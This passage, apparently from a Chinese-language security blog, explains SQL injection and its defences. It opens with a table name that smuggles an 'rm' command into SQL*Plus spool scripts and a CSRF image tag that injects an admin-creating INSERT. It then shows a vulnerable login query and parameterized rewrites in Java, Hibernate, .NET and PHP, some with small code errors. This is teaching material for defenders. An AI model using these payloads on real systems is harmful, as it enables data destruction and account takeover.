&lt;h4 id=&#34;在Oracle上运行操作系统命令&#34;&gt;&lt;a href=&#34;#在Oracle上运行操作系统命令&#34; class=&#34;headerlink&#34; title=&#34;在Oracle上运行操作系统命令&#34;&gt;&lt;/a&gt;在Oracle上运行操作系统命令&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;!rm Rf/&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a varchar2 &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#该命令能被Oracle接受&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果DBA或开发人员使用带spool命令（DBA编写动态SQL脚本时经常使用的技术）的 SQL*Plus脚本，那么SQL*Plus会清除上述例子中的双引号以便访问该对象。接下来SQL*Plus 会将感叹号解析成主机命令（UNIX中是！，Windows和VMS中是$），并将感叹号后面的内容作为操作系统命令执行。&lt;/p&gt;
&lt;p&gt;下面是一个易受攻击的SQL*Plus脚本的例子。它创建了一个名为test.sql的spool文件， 之后执行该文件：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;SPOOL test.sql
SELECT table_name FROM all_tables WHERE &lt;span class=&#34;token assign-left variable&#34;&gt;owner&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SCOTT&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
SPOOL OFF
@test.sql&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;利用验证过的漏洞&#34;&gt;&lt;a href=&#34;#利用验证过的漏洞&#34; class=&#34;headerlink&#34; title=&#34;利用验证过的漏洞&#34;&gt;&lt;/a&gt;利用验证过的漏洞&lt;/h4&gt;&lt;p&gt;如果管理员在应用程序中完全可信，那么他们将能够直接在数据库中执行任意SQL查询。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;https:&lt;span class=&#34;token comment&#34;&gt;//www.example.org/admin/ViewUser.aspx?UID=123&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#若UID是管理员,就可以直接利用管理员权限攻击&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#构造跨站伪造,诱导管理员帮助我们执行命令&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;img src&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; https://www.example.org/admin/ViewUser.aspx?UID=123;+INSERT+INTO+USERS+(username,password,isAdmin)+VALUES+(&#39;pablo&#39;,&#39;quest45th&#39;, true)&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#若管理员点击图片就会帮我们创建一个新的管理员用户,这个用户我们能掌握。&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;代码层防御&#34;&gt;&lt;a href=&#34;#代码层防御&#34; class=&#34;headerlink&#34; title=&#34;代码层防御&#34;&gt;&lt;/a&gt;代码层防御&lt;/h2&gt;&lt;h3 id=&#34;领域驱动的安全&#34;&gt;&lt;a href=&#34;#领域驱动的安全&#34; class=&#34;headerlink&#34; title=&#34;领域驱动的安全&#34;&gt;&lt;/a&gt;领域驱动的安全&lt;/h3&gt;&lt;p&gt;领域驱动的安全(Domain Driven Security, DDS)是一种设计代码的方法，以这种方法设计的代码可以避免典型的注入问题&lt;/p&gt;
&lt;p&gt;领域驱动的安全是一种开发方法，它的目标是帮助开发人员进行推理并缓解任何类型的注入攻击的威胁——包括SQL注入和跨站脚本攻击。领域驱动的安全是开发人员为开发人员创建的理念，它的灵感来自于Eric Evans提出的领域驱动设计，它试图充分利用来自于DDD的概念以提高应用程序的安全性。&lt;/p&gt;
&lt;p&gt;简单来说，就是把所有过滤、处理的过程封装成一个类，将这个处理类放在输出到服务器之间，自动过滤&lt;/p&gt;
&lt;p&gt;当然，过滤不能完全处理，使用参数化语言也是明智选择，有时编码也能解决问题，但是考虑到不同数据库的处理不同，也会衍生相应问题&lt;/p&gt;
&lt;h3 id=&#34;使用参数化语言&#34;&gt;&lt;a href=&#34;#使用参数化语言&#34; class=&#34;headerlink&#34; title=&#34;使用参数化语言&#34;&gt;&lt;/a&gt;使用参数化语言&lt;/h3&gt;&lt;p&gt;大多数现代编程语言和数据库访问API可以使用占位符或绑定变量来向SQL查询提供参数(而非直接对用户输入进行操作)。通常称之为参数化语句&lt;/p&gt;
&lt;p&gt;虽然它们不会修改传递给数据库的内容，但如果正在调用的数据库功能在存储过程或函数的实现中使用了动态SQL，那么仍然可能出现SQL注入。Microsoft SQL Server和Oracle长期受该问题的困扰，因为它们之前附带安装了很多内置的易受SQL注入攻击的存储过程。&lt;/p&gt;
&lt;p&gt;二次注入也可能实现&lt;/p&gt;
&lt;p&gt;并不是所有的SQL语句都可以参数化。特别是只能参数化数据值，而不能参数化SQL标识符或关键字。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;Username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;username&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
Password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;password&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;Sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;SELECT * FROM users WHERE username=&#39;&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; Username &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#39;AND password=&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;Password &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#39;&#34;&lt;/span&gt;
Result &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Db&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;Execute&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;Sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;If&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Result&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* successful login */&lt;/span&gt; &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这是一段易受攻击代码，下面将会对它参数化&lt;/p&gt;
&lt;h4 id=&#34;Java中的参数化语句&#34;&gt;&lt;a href=&#34;#Java中的参数化语句&#34; class=&#34;headerlink&#34; title=&#34;Java中的参数化语句&#34;&gt;&lt;/a&gt;Java中的参数化语句&lt;/h4&gt;&lt;p&gt;Java提供了JDBC框架(在java.sql和javax.sql命名空间中实现)，作为独立于供应商的数据库访问方法。JDBC支持多种多样的数据库访问方法，包括通过PreparedStatement类来使用参数化语句。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-java&#34; data-language=&#34;java&#34;&gt;&lt;code class=&#34;language-java&#34;&gt;&lt;span class=&#34;token class-name&#34;&gt;Connection&lt;/span&gt; con &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;DriverManager&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getConnection&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;connectionstring&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; sql &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;SELECT * FROM users WHERE username=? AND password=?&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token class-name&#34;&gt;PreparedStatement&lt;/span&gt; lookupusers &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; con&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;prepareStatement&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sql&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//将参数添加到SQL查询中&lt;/span&gt;
lookupUser&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;setstring &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//在位置1添加字符串&lt;/span&gt;
lookupUser&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;setstring &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//在位置2添加字符串&lt;/span&gt;
rs &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; lookupUser&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;executeQuery&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;//添加参数时（通过使用不同的ser&amp;lt;type&amp;gt;函数，比如setString）指定了问号(?)占位符的编号位置（从1开始）&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在J2EE应用中，除了使用Java提供的JDBC框架外，通常还可以使用附加的包来高效地访问数据库。常用的访问数据库的持久化框架为Hibernate。&lt;/p&gt;
&lt;p&gt;除了可以使用固有的SQL功能和前面介绍的JDBC功能外，Hibernate还提供了自己的功能来将变量绑定到参数化语句。Query对象提供了使用命名参数(使用冒号指定，parameter) 或JDBC风格的问号占位符(?)的方法。&lt;/p&gt;
&lt;p&gt;下面的例子展示了如何使用带命名参数的Hibernate：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-java&#34; data-language=&#34;java&#34;&gt;&lt;code class=&#34;language-java&#34;&gt;string sql &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;SELECT * FROM users WHERE username=:username AND&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;password=:password&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;Query&lt;/span&gt; lookupUser &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; session&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;createQuery&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sql&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//将参数添加到SQL查询中&lt;/span&gt;
lookupUsers&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setstring&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;username&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;// 添加 username&lt;/span&gt;
lookupUsers&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setstring&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;password&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//添加 password&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;List&lt;/span&gt; rs &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; lookupUser&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;接下来的例子展示了如何在Hibernate的参数中，使用JDBC风格的问号占位符。请注意， Hibernate从0开始而不是像JDBC那样从1开始对参数进行编号。因此，列表中的第一个参数为0，第二个为1&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-java&#34; data-language=&#34;java&#34;&gt;&lt;code class=&#34;language-java&#34;&gt;string sql &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;SELECT * FROM users WHERE username=? AND password=?&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;Query&lt;/span&gt; lookupUser &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; session&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;createQuery&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sql&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//将参数添加到SQL查询中&lt;/span&gt;
lookupUser&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setstring&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;username&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;//添加username&lt;/span&gt;
lookupUser&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;setString&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;//添加password&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;List&lt;/span&gt; rs &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; lookupUser&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;NET-C-中的参数化语句&#34;&gt;&lt;a href=&#34;#NET-C-中的参数化语句&#34; class=&#34;headerlink&#34; title=&#34;.NET(C#)中的参数化语句&#34;&gt;&lt;/a&gt;.NET(C#)中的参数化语句&lt;/h4&gt;&lt;p&gt;Microsoft .NET提供了很多不同的访问方式，它们使用ADO.NET框架来参数化语句。ADO.NET还提供了附加的功能，可以进一步检查提供的参数，比如对提交的数据执行类型检查等。&lt;/p&gt;
&lt;p&gt;根据访问的数据库类型的不同，ADO.NET提供了4种不同的数据提供程序:用于Microsoft SQL Server 的 System.Data.SqlClient，用于 Oracle 数据库的 System.Data.OracleClient,以及分别用 于OLE DB和ODBC数据源的System.Data.OleDb和System.Data.Odbc&lt;/p&gt;
&lt;p&gt;ADO.NET数据提供程序以及参数命名语法&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数据提供程序&lt;/th&gt;
&lt;th&gt;参数语法&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;System.Data.SqlClient&lt;/td&gt;
&lt;td&gt;@parameter&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;System.Data.OracleClient&lt;/td&gt;
&lt;td&gt;:parameter(只能位于参数化的SQL命令文本中)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;System.Data.OleDb&lt;/td&gt;
&lt;td&gt;带问号占位符(?)的位置参数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;System.Data.Odbc&lt;/td&gt;
&lt;td&gt;带问号占位符(?)的位置参数&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;使用SqlClient数据提供程序将其重写为.NET格式的参数化语句&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-c#&#34; data-language=&#34;c#&#34;&gt;&lt;code class=&#34;language-c#&#34;&gt;SqlConnection con = new SqlConnection(Connectionstring);
string Sql = &#34;SELECT * FROM users WHERE username=@username&#34; + &#34;AND password=@password&#34;;
cmd = new SqlCommand(Sql, con); 
//将参数添加到SQL查询中
cmd.Parameters.Add(&#34;@username&#34;,//参数名
                   SqlDbType.NVarChar,//数据类型
                   16);//长度
cmd.Parameters.Add(&#34;@password&#34;,
                   SqlDbType.NVarChar,
                   16);
cmd.Parameters.Value[&#34;@username&#34;]=username;//设置参数
cmd.Parameters.Value[&#34;@password&#34;]=password;//提供参数值
reader = cmd.ExecuteReader();&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用OracleClient数据提供程序重写的同一.NET格式的参数化语句。 在命令文本（SQL字符串）中的参数前面添加了冒号，而不是在代码的其他位置&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-c#&#34; data-language=&#34;c#&#34;&gt;&lt;code class=&#34;language-c#&#34;&gt;SqlConnection con = new SqlConnection(Connectionstring);
string Sql = &#34;SELECT * FROM users WHERE username=:username&#34; + &#34;AND password=:password&#34;;
cmd = new SqlCommand(Sql, con); 
//将参数添加到SQL查询中
cmd.Parameters.Add(&#34;username&#34;,//参数名
                   SqlDbType.NVarChar,//数据类型
                   16);//长度
cmd.Parameters.Add(&#34;password&#34;,
                   SqlDbType.NVarChar,
                   16);
cmd.Parameters.Value[&#34;username&#34;]=username;//设置参数
cmd.Parameters.Value[&#34;password&#34;]=password;//提供参数值
reader = cmd.ExecuteReader();&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用OleDbClient数据提供程序重写的同一.NET格式的参数化语句。 使用OleDbClient或OleDb数据提供程序时，必须按照正确的问号占位符顺序来添加参数&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-c#&#34; data-language=&#34;c#&#34;&gt;&lt;code class=&#34;language-c#&#34;&gt;SqlConnection con = new SqlConnection(Connectionstring);
string Sql = &#34;SELECT * FROM users WHERE username=? + &#34;AND password=?&#34;;
cmd = new SqlCommand(Sql, con); 
//将参数添加到SQL查询中
cmd.Parameters.Add(&#34;@username&#34;,//参数名
                   SqlDbType.NVarChar,//数据类型
                   16);//长度
cmd.Parameters.Add(&#34;@password&#34;,
                   SqlDbType.NVarChar,
                   16);
cmd.Parameters.Value[&#34;@username&#34;]=username;//设置参数
cmd.Parameters.Value[&#34;@password&#34;]=password;//提供参数值
reader = cmd.ExecuteReader();&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;PHP中的参数化语句&#34;&gt;&lt;a href=&#34;#PHP中的参数化语句&#34; class=&#34;headerlink&#34; title=&#34;PHP中的参数化语句&#34;&gt;&lt;/a&gt;PHP中的参数化语句&lt;/h4&gt;&lt;p&gt;PHP同样包含很多用于访问数据库的框架。本节介绍三种最常见的框架：访问MySQL数据库的mysqli包，PEAR::MDB2包（它替代了流行的PEAR::DB包）以及新的PHP数据对象（PHP Data Object, PDO)框架，它们均为使用参数化语句提供了便利。&lt;/p&gt;
&lt;p&gt;mysqli包适用于PHP 5.x，可以访问MySQL 4.1及之后的版本。通过使用问号占位符来支持参数化语句。下面的例子展示了一条使用mysqli包的参数化语句&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$con&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;mysqli&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;localhost&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;username&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;password&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;db&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;SELECT * FROM users WHERE username=? AND password=?&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$cmd&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$con&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;prepare&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//将参数添加到SQL查询中&lt;/span&gt;
